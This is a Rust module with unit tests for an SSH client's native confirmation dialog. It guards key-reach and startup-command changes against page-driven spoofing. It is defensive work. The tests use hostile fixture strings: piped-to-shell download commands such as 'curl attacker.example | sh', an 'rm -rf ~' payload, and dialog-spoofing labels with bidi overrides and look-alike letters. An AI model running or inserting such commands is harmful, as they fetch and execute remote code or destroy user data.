//! Native confirmation for host and identity writes that let a vault key sign
//! in somewhere new, or give a host a startup command it did not have.
//!
//! The page writes the store, and a saved host that signs in with a vault key
//! is a standing permission: use this key, as this account, against this
//! address. The first connection to an address trusts whatever server answers,
//! so a permission the page wrote on its own would hand the key's signature,
//! and a session the page can type into, to a server of its choosing. A write
//! that grants a permission no saved host holds yet is therefore confirmed in
//! the same OS-drawn dialog `host_key_prompt` shows, which a script can neither
//! read nor answer. `Store` refuses such a write unless the caller hands it
//! what the user confirmed, so a writer that skips this module fails instead of
//! granting one by accident.
//!
//! What the dialog lists is worked out here from the store as it would stand
//! after the write, and a key is named from the vault's own metadata, so the
//! page never supplies a description of its own change.
//!
//! A startup command is typed into the shell on every connect, so one the
//! page stores keeps running long after the page that wrote it, and nothing on
//! the way to a connection shows it. A write that puts a command on a host, or
//! changes the one it has, is confirmed in the same dialog; see
//! `clavyn_core::startup_command`.
//!
//! Writes that introduce neither go through without a question: renames, tags,
//! groups, password hosts, clearing a command, and any edit that leaves every
//! host's key reach and command where they were.
//!
//! This guards against a page acting without the user, not against the user.
//! Whoever clicks Allow has allowed it.

use crate::host_key_prompt::{self, PromptGate};
use clavyn_core::key_reach::NewReach;
use clavyn_core::keys::KeyMeta;
use clavyn_core::startup_command::NewCommand;
use clavyn_core::store::{Introduced, Store, StoreData};
use clavyn_core::CoreError;
use std::time::Duration;
use tauri::AppHandle;
use tokio::sync::Mutex;
use unicode_general_category::{get_general_category, GeneralCategory};
use uuid::Uuid;

/// Marks the error raised when the user answered the dialog with Cancel, so a
/// form can say the change was not saved without reporting it as a failure.
pub const DECLINED: &str = "[host-change-confirmation-declined]";

const TITLE: &str = "Allow a vault key to be used";

/// The title when the change sets startup commands and no key reach.
const COMMAND_TITLE: &str = "Allow a startup command";

/// The most hosts one dialog asks about. Every host it asks about is listed in
/// full, because Allow must never approve a destination the dialog did not
/// name. A write that would let a key sign in at more hosts than this is
/// refused without a question, and the user makes the change in smaller steps.
const LISTED_HOSTS: usize = 5;

/// The longest dialog text, in characters, that is shown. A count of hosts does
/// not bound the height, because every host can print long strings, and a
/// dialog taller than the screen pushes Cancel out of reach while Allow keeps
/// the focus. A longer text is refused without a question, like a write that
/// lists too many hosts.
const MESSAGE_LIMIT: usize = 1800;

/// The longest each stored string may print, counted in what the dialog
/// shows, escapes included.
const LABEL_LIMIT: usize = 64;
const ADDRESS_LIMIT: usize = 255;
const COMMAND_LIMIT: usize = 300;

/// How long a Cancel in this dialog keeps it from opening again, for each
/// refusal in a row.
///
/// The first is far shorter than the host key gate's: after a Cancel the forms
/// keep what was typed, so it can be corrected and saved again, and that retry
/// should be asked about rather than refused. Each refusal after it holds off
/// longer, up to five minutes, so a script that keeps reopening the dialog
/// gets a long silence per Cancel instead of a new dialog every few seconds.
const DECLINE_COOLDOWNS: &[Duration] = &[
    Duration::from_secs(5),
    Duration::from_secs(30),
    Duration::from_secs(300),
];

/// The gate these dialogs share. It is kept apart from the host key gate so a
/// refusal of one kind of question does not silence the other; the two are
/// handed one dialog slot when the state is built, so they still never show at
/// the same time.
pub fn gate() -> PromptGate {
    PromptGate::for_subject("host change", DECLINED, DECLINE_COOLDOWNS)
}

/// Apply `edit` to the store, asking `confirm` first when the write would let a
/// vault key sign in somewhere new or give a host a new startup command.
///
/// The decision and a write that needs no question happen under one lock, so
/// nothing can slip in between deciding "nothing new" and writing. The lock is
/// not held across the dialog, which can stay open for minutes while the store
/// keeps serving connections. Afterwards the write goes ahead only if the hosts
/// and identities are exactly as they were when the dialog was worked out: the
/// edit is a whole record taken from the page, so applying it to a store that
/// moved on would put back what a later change replaced. `Store` then checks
/// the write against what was shown, and refuses it if it would allow anything
/// more.
pub async fn write_confirmed<E, F, Fut>(
    store: &Mutex<Store>,
    edit: E,
    confirm: F,
) -> Result<(), String>
where
    E: Fn(&mut StoreData),
    F: FnOnce(Introduced) -> Fut,
    Fut: std::future::Future<Output = Result<(), String>>,
{
    let (shown, seen) = {
        let mut store = store.lock().await;
        // A write that introduces nothing is settled in this one pass. `Store`
        // refuses and rolls back one that does, which is the case to ask about.
        match store.commit_confirmed(&edit, &Introduced::default()) {
            Err(CoreError::UnconfirmedKeyReach | CoreError::UnconfirmedStartupCommand) => {}
            written => return written.map_err(|e| e.to_string()),
        }
        (store.preview(&edit), store.data().access_copy())
    };
    let listed = shown.reaches.len() + commands_apart(&shown).len();
    if listed > LISTED_HOSTS {
        return Err(format!(
            "this change would need confirming at {listed} hosts, more than the {LISTED_HOSTS} one \
             confirmation can list; {SMALLER_STEPS}"
        ));
    }
    confirm(shown.clone()).await?;
    let mut store = store.lock().await;
    if !seen.same_hosts_and_identities(store.data()) {
        return Err(CHANGED_DURING_DIALOG.to_string());
    }
    store.commit_confirmed(&edit, &shown).map_err(|e| match e {
        CoreError::UnconfirmedKeyReach | CoreError::UnconfirmedStartupCommand => {
            CHANGED_DURING_DIALOG.to_string()
        }
        e => e.to_string(),
    })
}

const CHANGED_DURING_DIALOG: &str =
    "the saved hosts changed while the confirmation was open; save again to review the change";

/// What to do about a change too big for one dialog. An identity's edit reaches
/// every host that links it at once, so for it the steps are to unlink hosts,
/// change the identity, and link them back a few at a time.
const SMALLER_STEPS: &str = "make it in smaller steps, a few hosts at a time (for an identity, \
     unlink some of its hosts first, change the identity, then link them back a few at a time)";

/// Ask the user, in a native dialog, to allow what `introduced` lists. `keys`
/// is the vault's key metadata, or `None` while the vault is locked.
pub async fn confirm(
    app: &AppHandle,
    gate: &PromptGate,
    introduced: &Introduced,
    keys: Option<&[KeyMeta]>,
) -> Result<(), String> {
    let text = checked_message(introduced, keys)?;
    let title = if introduced.reaches.is_empty() {
        COMMAND_TITLE
    } else {
        TITLE
    };
    host_key_prompt::confirm(app, gate, title, &text, "Allow").await
}

/// The dialog text for `introduced`, or why it cannot be asked as one dialog.
fn checked_message(introduced: &Introduced, keys: Option<&[KeyMeta]>) -> Result<String, String> {
    let text = message(introduced, keys);
    if text.chars().count() > MESSAGE_LIMIT {
        return Err(format!(
            "the confirmation for this change would be too long to read in one dialog, so it was \
             not asked; shorten the host names, labels and commands involved, or {SMALLER_STEPS}"
        ));
    }
    Ok(text)
}

/// The commands `introduced` sets that its key reaches do not already show: a
/// host that gets a new reach and a new command at once is listed once, with
/// its command, among the reaches.
fn commands_apart(introduced: &Introduced) -> Vec<&NewCommand> {
    introduced
        .commands
        .iter()
        .filter(|command| {
            !introduced.reaches.iter().any(|new| {
                new.host_id == command.host_id
                    && new.startup_command.as_deref() == Some(command.command.as_str())
            })
        })
        .collect()
}

/// The dialog text for `introduced`, every key reach and command listed.
///
/// The account and the server are on lines of their own, because both are text
/// the page chose and joined into one `user@host` string a username could end
/// in a plausible host of its own.
pub fn message(introduced: &Introduced, keys: Option<&[KeyMeta]>) -> String {
    let mut parts = Vec::new();
    if !introduced.reaches.is_empty() {
        parts.push(reaches_text(&introduced.reaches, keys));
    }
    let commands = commands_apart(introduced);
    if !commands.is_empty() {
        parts.push(commands_text(&commands));
    }
    let mut text = parts.join("\n\n");
    text.push_str("\n\nAllow this only if you are making this change yourself.");
    text
}

/// The part of the dialog that lists commands set apart from any key reach.
fn commands_text(commands: &[&NewCommand]) -> String {
    let mut text = String::from(
        "This change sets a command that is typed into your shell every time you connect to:\n",
    );
    for new in commands {
        text.push_str(&format!(
            "\n{}\n    Account: {}\n    Server:  {}:{}\n    Runs on connect: {}\n",
            shown(&new.host_label, LABEL_LIMIT),
            shown(&new.username, LABEL_LIMIT),
            address(&new.hostname),
            new.port,
            shown(&new.command, COMMAND_LIMIT),
        ));
    }
    text.push_str("\nIt runs as that account on every connection until it is changed or removed.");
    text
}

/// The part of the dialog that lists new key reaches.
fn reaches_text(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
    let mut text = String::from(
        "This change lets a key from your vault sign in where no saved host lets it sign in \
         now:\n",
    );
    for new in reaches {
        let reach = &new.reach;
        text.push_str(&format!(
            "\n{}\n    Account: {}\n    Server:  {}:{}\n    Key:     {}\n",
            shown(&new.host_label, LABEL_LIMIT),
            shown(&reach.username, LABEL_LIMIT),
            address(&reach.hostname),
            reach.port,
            key_name(reach.key_id, keys),
        ));
        if let Some(command) = &new.startup_command {
            text.push_str(&format!(
                "    Runs on connect: {}\n",
                shown(command, COMMAND_LIMIT)
            ));
        }
    }
    let runs = if reaches.iter().any(|new| new.startup_command.is_some()) {
        " and the command runs on it"
    } else {
        ""
    };
    text.push_str(&format!(
        "\nThe first connection to an address trusts whichever server answers there, so the key \
         signs in to that server{runs}."
    ));
    text
}

/// A host name is ASCII in practice, so every other character prints as an
/// escape: a letter from another script can then not pass for the Latin one it
/// resembles. An IPv6 literal is bracketed so the port reads apart from it.
fn address(hostname: &str) -> String {
    let shown = render(hostname, ADDRESS_LIMIT, |c| !c.is_ascii() || is_hidden(c));
    if hostname.contains(':') {
        format!("[{shown}]")
    } else {
        shown
    }
}

fn key_name(id: Uuid, keys: Option<&[KeyMeta]>) -> String {
    match keys {
        None => format!("{id} (unlock the vault to see which key this is)"),
        Some(keys) => match keys.iter().find(|key| key.id == id) {
            Some(key) => format!("{} ({})", shown(&key.label, LABEL_LIMIT), key.fingerprint),
            None => format!("{id}, which is not in the vault"),
        },
    }
}

/// Whether `c` is printed as an escape rather than as itself.
///
/// Decided by general category rather than from a list of known offenders, so
/// a mark nobody thought of is caught along with the rest: controls (Cc),
/// format characters (Cf: zero-width characters, the marks that reorder
/// bidirectional text, tag characters), and line and paragraph separators (Zl,
/// Zp), which the dialog lays out as line breaks. Private-use and unassigned
/// code points (Co, Cn) are escaped too, since this build cannot say how the
/// system will draw them; a format character added in a later Unicode version
/// is unassigned here. Spaces other than the plain one (Zs) and a few letters
/// and marks that draw nothing (`is_blank_filler`) are escaped as well, because
/// they pad a line or stand in for an empty value without showing anything.
fn is_hidden(c: char) -> bool {
    use GeneralCategory::*;
    match get_general_category(c) {
        Control | Format | LineSeparator | ParagraphSeparator | PrivateUse | Unassigned => true,
        SpaceSeparator => c != ' ',
        _ => is_blank_filler(c),
    }
}

/// Characters outside the separator categories that draw as blank: the Hangul
/// and Braille fillers, the combining grapheme joiner, and the Khmer inherent
/// vowels.
fn is_blank_filler(c: char) -> bool {
    matches!(
        c,
        '\u{034F}'
            | '\u{115F}'
            | '\u{1160}'
            | '\u{17B4}'
            | '\u{17B5}'
            | '\u{2800}'
            | '\u{3164}'
            | '\u{FFA0}'
    )
}

/// Render a stored string for the dialog.
///
/// Every string here was written by the page. Line breaks, control characters
/// and layout marks could redraw the dialog — a label carrying a newline and a
/// reassuring paragraph, say — so they are printed as escapes. A long value is
/// cut with a count of what was left out, so padding cannot push the part that
/// matters out of view without the cut being visible. The limit counts what is
/// printed, so a value made of characters that each print as a long escape
/// takes no more room than any other; an escape is never cut in half.
fn shown(text: &str, limit: usize) -> String {
    render(text, limit, is_hidden)
}

/// `shown` with the choice of which characters print as escapes left to
/// `escape`.
fn render(text: &str, limit: usize, escape: impl Fn(char) -> bool) -> String {
    let mut out = String::new();
    let mut printed = 0;
    let mut kept = 0;
    for c in text.chars() {
        let piece: String = if escape(c) {
            c.escape_unicode().collect()
        } else {
            c.into()
        };
        let width = piece.chars().count();
        if printed + width > limit {
            break;
        }
        out.push_str(&piece);
        printed += width;
        kept += 1;
    }
    let left_out = text.chars().count() - kept;
    if left_out > 0 {
        out.push_str(&format!("… ({left_out} more characters)"));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use clavyn_core::host::{AuthMethod, Host};
    use clavyn_core::identity::Identity;
    use clavyn_core::key_reach::KeyReach;
    use clavyn_core::keys::KeyType;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn key_host(hostname: &str, key: Uuid) -> Host {
        let mut host = Host::new("prod", hostname, 22, "deploy");
        host.auth = AuthMethod::PublicKey;
        host.key_id = Some(key);
        host
    }

    fn password_host(hostname: &str) -> Host {
        let mut host = Host::new("lab", hostname, 22, "deploy");
        host.auth = AuthMethod::Password {
            credential_key: "default".into(),
        };
        host
    }

    fn new_reach(label: &str, hostname: &str, key: Uuid, command: Option<&str>) -> NewReach {
        NewReach {
            host_id: Uuid::new_v4(),
            host_label: label.into(),
            reach: KeyReach {
                key_id: key,
                username: "deploy".into(),
                hostname: hostname.into(),
                port: 22,
            },
            startup_command: command.map(str::to_owned),
        }
    }

    fn only_reaches(reaches: &[NewReach]) -> Introduced {
        Introduced {
            reaches: reaches.to_vec(),
            commands: Vec::new(),
        }
    }

    fn message_for(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
        message(&only_reaches(reaches), keys)
    }

    fn checked_for(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> Result<String, String> {
        checked_message(&only_reaches(reaches), keys)
    }

    fn meta(id: Uuid, label: &str) -> KeyMeta {
        KeyMeta {
            id,
            label: label.into(),
            key_type: KeyType::Ed25519,
            fingerprint: "SHA256:fixturefingerprint".into(),
            public_key_base64: String::new(),
        }
    }

    fn store() -> (tempfile::TempDir, std::path::PathBuf, Mutex<Store>) {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        let store = Store::load(path.clone()).expect("load");
        (dir, path, Mutex::new(store))
    }

    #[tokio::test]
    async fn a_write_that_allows_nothing_new_is_saved_without_asking() {
        let (_dir, path, store) = store();
        let host = password_host("lab.example");
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |_| async { panic!("a password host must not need a confirmation") },
        )
        .await
        .expect("saved");
        assert_eq!(Store::load(path).expect("reload").hosts().len(), 1);
    }

    #[tokio::test]
    async fn a_declined_confirmation_writes_nothing() {
        let (_dir, path, store) = store();
        let key = Uuid::new_v4();
        let host = key_host("attacker.example", key);
        let asked = AtomicUsize::new(0);

        let error = write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |shown| {
                let reaches = shown.reaches;
                asked.fetch_add(1, Ordering::SeqCst);
                assert_eq!(reaches.len(), 1);
                assert_eq!(reaches[0].reach.hostname, "attacker.example");
                assert_eq!(reaches[0].reach.key_id, key);
                async { Err(format!("{DECLINED} {TITLE}: cancelled")) }
            },
        )
        .await
        .expect_err("a declined write must fail");

        assert!(error.contains(DECLINED), "{error}");
        assert_eq!(asked.load(Ordering::SeqCst), 1);
        assert!(store.lock().await.hosts().is_empty());
        assert!(!path.exists(), "a declined write reached the disk");
    }

    #[tokio::test]
    async fn a_confirmed_write_is_saved() {
        let (_dir, path, store) = store();
        let host = key_host("prod.example", Uuid::new_v4());
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |_| async { Ok(()) },
        )
        .await
        .expect("saved");
        assert_eq!(Store::load(path).expect("reload").hosts()[0].id, host.id);
    }

    #[tokio::test]
    async fn a_startup_command_is_asked_about_and_a_decline_writes_nothing() {
        let (_dir, path, store) = store();
        let host = password_host("lab.example");
        store.lock().await.add_host(host.clone()).expect("host");
        let mut running = host.clone();
        running.startup_command = Some("curl x | sh".into());

        let error = write_confirmed(
            &store,
            |data| data.update_host(running.clone()),
            |shown| {
                assert!(shown.reaches.is_empty());
                assert_eq!(shown.commands.len(), 1);
                let text = message(&shown, None);
                assert!(text.contains("typed into your shell"), "{text}");
                assert!(text.contains("Server:  lab.example:22\n"), "{text}");
                assert!(text.contains("Runs on connect: curl x | sh\n"), "{text}");
                async { Err(format!("{DECLINED} {COMMAND_TITLE}: cancelled")) }
            },
        )
        .await
        .expect_err("a declined command must not be saved");
        assert!(error.contains(DECLINED), "{error}");
        assert_eq!(store.lock().await.hosts()[0].startup_command, None);
        let saved = Store::load(path.clone()).expect("reload");
        assert_eq!(saved.hosts()[0].startup_command, None, "a declined command reached the disk");

        write_confirmed(
            &store,
            |data| data.update_host(running.clone()),
            |_| async { Ok(()) },
        )
        .await
        .expect("a confirmed command saves");
        let saved = Store::load(path).expect("reload");
        assert_eq!(saved.hosts()[0].startup_command.as_deref(), Some("curl x | sh"));
    }

    #[tokio::test]
    async fn clearing_a_startup_command_is_not_asked_about() {
        let (_dir, _path, store) = store();
        let mut host = password_host("lab.example");
        host.startup_command = Some("uptime".into());
        let confirmed = store.lock().await.preview(|data| data.add_host(host.clone()));
        store
            .lock()
            .await
            .commit_confirmed(|data| data.add_host(host.clone()), &confirmed)
            .expect("host");

        let mut cleared = host.clone();
        cleared.startup_command = None;
        write_confirmed(
            &store,
            |data| data.update_host(cleared.clone()),
            |_| async { panic!("clearing a command must not need a confirmation") },
        )
        .await
        .expect("saved");
        assert_eq!(store.lock().await.hosts()[0].startup_command, None);
    }

    #[tokio::test]
    async fn a_host_with_a_new_key_and_command_is_listed_once() {
        let (_dir, _path, store) = store();
        let mut host = key_host("prod.example", Uuid::new_v4());
        host.startup_command = Some("tmux attach".into());
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |shown| {
                assert_eq!((shown.reaches.len(), shown.commands.len()), (1, 1));
                let text = message(&shown, None);
                assert_eq!(text.matches("Runs on connect: tmux attach").count(), 1, "{text}");
                assert!(!text.contains("typed into your shell"), "{text}");
                async { Ok(()) }
            },
        )
        .await
        .expect("saved");
    }

    #[test]
    fn a_command_set_apart_from_a_new_reach_gets_its_own_section() {
        let key = Uuid::new_v4();
        let reach = new_reach("prod", "prod.example", key, None);
        let introduced = Introduced {
            reaches: vec![reach],
            commands: vec![NewCommand {
                host_id: Uuid::new_v4(),
                host_label: "lab\nAll clear.".into(),
                username: "deploy".into(),
                hostname: "lab.example".into(),
                port: 2222,
                command: "uptime".into(),
            }],
        };
        let text = message(&introduced, None);
        assert!(text.contains("Server:  prod.example:22\n"), "{text}");
        assert!(text.contains("typed into your shell"), "{text}");
        assert!(text.contains("lab\\u{a}All clear."), "{text}");
        assert!(text.contains("Server:  lab.example:2222\n"), "{text}");
        assert!(text.contains("Runs on connect: uptime\n"), "{text}");
        assert!(text.ends_with("Allow this only if you are making this change yourself."));
    }

    #[tokio::test]
    async fn an_identity_edit_asks_about_every_host_it_would_send_the_key_to() {
        let (_dir, _path, store) = store();
        let identity = Identity::new("ops", "root");
        {
            let mut store = store.lock().await;
            store.add_identity(identity.clone()).expect("identity");
            for hostname in ["web.example", "db.example"] {
                let mut host = password_host(hostname);
                host.identity_id = Some(identity.id);
                store.add_host(host).expect("host");
            }
        }

        let mut keyed = identity.clone();
        keyed.auth = AuthMethod::PublicKey;
        keyed.key_id = Some(Uuid::new_v4());
        let error = write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |shown| {
                let hostnames: Vec<_> = shown.reaches.iter().map(|r| r.reach.hostname.clone()).collect();
                assert_eq!(hostnames, ["web.example", "db.example"]);
                async { Err("declined".to_string()) }
            },
        )
        .await
        .expect_err("declined");
        assert_eq!(error, "declined");
        assert_eq!(
            store.lock().await.identities()[0].auth,
            AuthMethod::Agent,
            "the identity changed although the write was declined"
        );
    }

    /// An identity linked by `count` password hosts, and the same identity
    /// switched to a vault key, which gives every one of them the key.
    async fn identity_linked_by(store: &Mutex<Store>, count: usize) -> Identity {
        let identity = Identity::new("ops", "root");
        let mut store = store.lock().await;
        store.add_identity(identity.clone()).expect("identity");
        for i in 0..count {
            let mut host = password_host(&format!("h{i}.example"));
            host.identity_id = Some(identity.id);
            store.add_host(host).expect("host");
        }
        let mut keyed = identity;
        keyed.auth = AuthMethod::PublicKey;
        keyed.key_id = Some(Uuid::new_v4());
        keyed
    }

    #[tokio::test]
    async fn a_dialog_asks_about_every_host_it_approves() {
        let (_dir, _path, store) = store();
        let keyed = identity_linked_by(&store, LISTED_HOSTS).await;
        write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |shown| {
                assert_eq!(shown.reaches.len(), LISTED_HOSTS);
                let text = message(&shown, None);
                for i in 0..LISTED_HOSTS {
                    assert!(
                        text.contains(&format!("Server:  h{i}.example:22")),
                        "{text}"
                    );
                }
                assert!(!text.contains("more host"), "{text}");
                async { Ok(()) }
            },
        )
        .await
        .expect("saved");
        assert_eq!(
            store.lock().await.identities()[0].auth,
            AuthMethod::PublicKey
        );
    }

    #[tokio::test]
    async fn a_write_reaching_more_hosts_than_a_dialog_lists_is_refused_unasked() {
        let (_dir, _path, store) = store();
        let keyed = identity_linked_by(&store, LISTED_HOSTS + 1).await;
        let error = write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |_| async { panic!("a dialog that cannot list every host must not be shown") },
        )
        .await
        .expect_err("a write broader than one dialog went through");
        assert!(error.contains("smaller steps"), "{error}");
        assert!(!error.contains(DECLINED), "{error}");
        assert_eq!(store.lock().await.identities()[0].auth, AuthMethod::Agent);
    }

    #[tokio::test]
    async fn a_write_that_would_allow_more_than_was_shown_is_refused() {
        let (_dir, _path, store) = store();
        let mut identity = Identity::new("ops", "root");
        identity.auth = AuthMethod::PublicKey;
        identity.key_id = Some(Uuid::new_v4());
        let mut first = password_host("web.example");
        first.identity_id = Some(identity.id);
        store.lock().await.add_host(first).expect("host");

        // While the dialog about the first host is open, a second host starts
        // linking the same identity. It was never shown, so the write that
        // would give it the key must not go through.
        let (concurrent, linked) = (&store, identity.id);
        let error = write_confirmed(
            &store,
            |data| data.add_identity(identity.clone()),
            move |shown| async move {
                assert_eq!(shown.reaches.len(), 1);
                let mut second = password_host("attacker.example");
                second.identity_id = Some(linked);
                concurrent
                    .lock()
                    .await
                    .add_host(second)
                    .expect("concurrent write");
                Ok(())
            },
        )
        .await
        .expect_err("a write broader than the dialog went through");
        assert!(
            error.contains("changed while the confirmation was open"),
            "{error}"
        );
        assert!(store.lock().await.identities().is_empty());
    }

    #[tokio::test]
    async fn a_change_made_while_the_dialog_is_open_is_not_overwritten() {
        let (_dir, _path, store) = store();
        let host = password_host("prod.example");
        store.lock().await.add_host(host.clone()).expect("host");

        // The page's copy of the host, with a key added: this write is asked
        // about. While the dialog is open the same host gets tags, which the
        // stale copy does not have.
        let mut keyed = host.clone();
        keyed.auth = AuthMethod::PublicKey;
        keyed.key_id = Some(Uuid::new_v4());
        let mut tagged = host.clone();
        tagged.tags = vec!["web".into()];

        let concurrent = &store;
        let error = write_confirmed(
            &store,
            |data| data.update_host(keyed.clone()),
            move |_| async move {
                concurrent
                    .lock()
                    .await
                    .update_host(tagged)
                    .expect("concurrent write");
                Ok(())
            },
        )
        .await
        .expect_err("the stale copy replaced a newer record");

        assert!(
            error.contains("changed while the confirmation was open"),
            "{error}"
        );
        let saved = store.lock().await.hosts()[0].clone();
        assert_eq!(saved.tags, ["web"], "the newer change was lost");
        assert_eq!(saved.auth, host.auth, "the refused change was applied");
    }

    #[tokio::test]
    async fn a_change_to_something_else_while_the_dialog_is_open_does_not_block_the_write() {
        let (_dir, _path, store) = store();
        let host = key_host("prod.example", Uuid::new_v4());
        let concurrent = &store;
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            move |_| async move {
                // Layouts and groups are not part of what was shown.
                concurrent
                    .lock()
                    .await
                    .add_group(clavyn_core::host::HostGroup::new("web"))
                    .expect("group");
                Ok(())
            },
        )
        .await
        .expect("a change that cannot move a reach blocked the write");
        assert_eq!(store.lock().await.hosts().len(), 1);
    }

    #[tokio::test]
    async fn the_way_out_of_a_change_too_big_for_one_dialog_is_named() {
        let (_dir, _path, store) = store();
        let keyed = identity_linked_by(&store, LISTED_HOSTS + 1).await;
        let error = write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |_| async { panic!("nothing should be asked") },
        )
        .await
        .expect_err("refused");
        assert!(error.contains("unlink some of its hosts"), "{error}");
    }

    #[test]
    fn the_message_names_the_destination_key_and_command() {
        let key = Uuid::new_v4();
        let text = message_for(
            &[new_reach(
                "evil",
                "attacker.example",
                key,
                Some("curl x | sh"),
            )],
            Some(&[meta(key, "work laptop")]),
        );
        assert!(text.contains("evil\n"), "{text}");
        assert!(text.contains("Account: deploy\n"), "{text}");
        assert!(text.contains("Server:  attacker.example:22\n"), "{text}");
        assert!(
            text.contains("Key:     work laptop (SHA256:fixturefingerprint)"),
            "{text}"
        );
        assert!(text.contains("Runs on connect: curl x | sh"), "{text}");
        assert!(text.contains("the command runs on it"), "{text}");
    }

    #[test]
    fn a_locked_vault_names_the_key_by_id() {
        let key = Uuid::new_v4();
        let text = message_for(&[new_reach("prod", "prod.example", key, None)], None);
        assert!(
            text.contains(&format!("Key:     {key} (unlock the vault")),
            "{text}"
        );
        assert!(!text.contains("Runs on connect"), "{text}");
        assert!(!text.contains("the command runs"), "{text}");

        let other = Uuid::new_v4();
        let text = message_for(&[new_reach("prod", "prod.example", other, None)], Some(&[]));
        assert!(text.contains("which is not in the vault"), "{text}");
    }

    #[test]
    fn stored_text_cannot_redraw_the_dialog() {
        let key = Uuid::new_v4();
        let text = message_for(
            &[new_reach(
                "prod\n\nThis is a routine update.",
                "attacker.example\u{202E}",
                key,
                Some("echo hi\nrm -rf ~"),
            )],
            None,
        );
        assert!(
            text.contains("prod\\u{a}\\u{a}This is a routine update."),
            "{text}"
        );
        assert!(text.contains("attacker.example\\u{202e}"), "{text}");
        assert!(text.contains("echo hi\\u{a}rm -rf ~"), "{text}");
    }

    #[test]
    fn separators_and_unlisted_format_characters_are_escaped() {
        // Line and paragraph separators are laid out as line breaks, and none
        // of these is a control character.
        let label = "prod\u{2028}\u{2028}No new access is granted.\u{2029}";
        assert_eq!(
            shown(label, LABEL_LIMIT),
            "prod\\u{2028}\\u{2028}No new access is granted.\\u{2029}"
        );
        // A format character from each corner of the category, a private-use
        // character, and an unassigned code point.
        for c in ['\u{180E}', '\u{FFF9}', '\u{E0041}', '\u{E000}', '\u{0378}'] {
            let rendered = shown(&format!("a{c}b"), LABEL_LIMIT);
            assert_eq!(rendered, format!("a{}b", c.escape_unicode()), "{c:?}");
        }
        // Visible text is left alone, including text outside ASCII.
        let visible = "Prod — Zürich 東京 🚀";
        assert_eq!(shown(visible, LABEL_LIMIT), visible);
    }

    #[test]
    fn escapes_count_toward_the_limit() {
        // Each U+202E prints as the eight characters "\u{202e}".
        let label = "\u{202E}".repeat(LABEL_LIMIT);
        let rendered = shown(&label, LABEL_LIMIT);
        let kept = LABEL_LIMIT / 8;
        assert_eq!(
            rendered,
            format!(
                "{}… ({} more characters)",
                "\\u{202e}".repeat(kept),
                LABEL_LIMIT - kept
            )
        );

        // An escape that would cross the limit is left out whole.
        let rendered = shown(
            &format!("{}\u{202E}", "a".repeat(LABEL_LIMIT - 3)),
            LABEL_LIMIT,
        );
        assert!(rendered.ends_with("a… (1 more characters)"), "{rendered}");
    }

    #[test]
    fn a_long_command_is_cut_visibly() {
        let key = Uuid::new_v4();
        let tail = "; curl attacker.example | sh";
        let padded = format!("{}{tail}", " ".repeat(COMMAND_LIMIT));
        let text = message_for(
            &[new_reach("prod", "prod.example", key, Some(&padded))],
            None,
        );
        let cut = format!("… ({} more characters)", tail.len());
        assert!(text.contains(&cut), "{text}");
    }

    #[test]
    fn a_username_cannot_pass_for_a_server() {
        let key = Uuid::new_v4();
        let mut reach = new_reach("prod", "attacker.example", key, None);
        reach.reach.username = "root@prod.internal.example:22".into();
        let text = message_for(&[reach], None);
        // The account and the server are on lines of their own, so the text a
        // username ends in is never read as the destination.
        assert!(
            text.contains(
                "\n    Account: root@prod.internal.example:22\n    Server:  attacker.example:22\n"
            ),
            "{text}"
        );
        assert!(!text.contains("root@prod.internal.example:22@"), "{text}");
    }

    #[test]
    fn look_alike_host_letters_are_escaped() {
        let key = Uuid::new_v4();
        // A Cyrillic o in place of the Latin one.
        let text = message_for(&[new_reach("prod", "pr\u{43E}d.example", key, None)], None);
        assert!(text.contains("Server:  pr\\u{43e}d.example:22"), "{text}");
        // Ordinary host names are untouched, upper case and digits included.
        assert_eq!(address("Web-01.Example.com"), "Web-01.Example.com");
    }

    #[test]
    fn spaces_and_fillers_that_draw_nothing_are_escaped() {
        for c in [
            '\u{00A0}', '\u{2003}', '\u{3000}', '\u{2800}', '\u{3164}', '\u{115F}', '\u{034F}',
        ] {
            let rendered = shown(&format!("a{c}b"), LABEL_LIMIT);
            assert_eq!(rendered, format!("a{}b", c.escape_unicode()), "{c:?}");
        }
        // A plain space is how words are told apart.
        assert_eq!(shown("web server", LABEL_LIMIT), "web server");
    }

    #[test]
    fn five_ordinary_hosts_fit_in_one_dialog() {
        let key = Uuid::new_v4();
        let reaches: Vec<_> = (0..LISTED_HOSTS)
            .map(|i| {
                new_reach(
                    &format!("production web server {i}"),
                    &format!("web-{i}.production.example.com"),
                    key,
                    Some("cd /srv/app && exec bash -l"),
                )
            })
            .collect();
        let keys = [meta(key, "work laptop")];
        let text = checked_for(&reaches, Some(&keys)).expect("an ordinary change was refused");
        assert!(text.chars().count() <= MESSAGE_LIMIT);
    }

    #[test]
    fn a_dialog_that_would_outgrow_the_screen_is_refused_unasked() {
        let key = Uuid::new_v4();
        let long = "x".repeat(1000);
        let reaches: Vec<_> = (0..LISTED_HOSTS)
            .map(|_| new_reach(&long, &long, key, Some(&long)))
            .collect();
        let error = checked_for(&reaches, None).expect_err("a huge dialog was built");
        assert!(error.contains("too long to read in one dialog"), "{error}");
        assert!(!error.contains(DECLINED), "{error}");
    }

    #[test]
    fn an_ipv6_address_is_bracketed_so_the_port_reads_apart() {
        let key = Uuid::new_v4();
        let text = message_for(&[new_reach("v6", "2001:db8::1", key, None)], None);
        assert!(text.contains("Server:  [2001:db8::1]:22"), "{text}");
    }
}
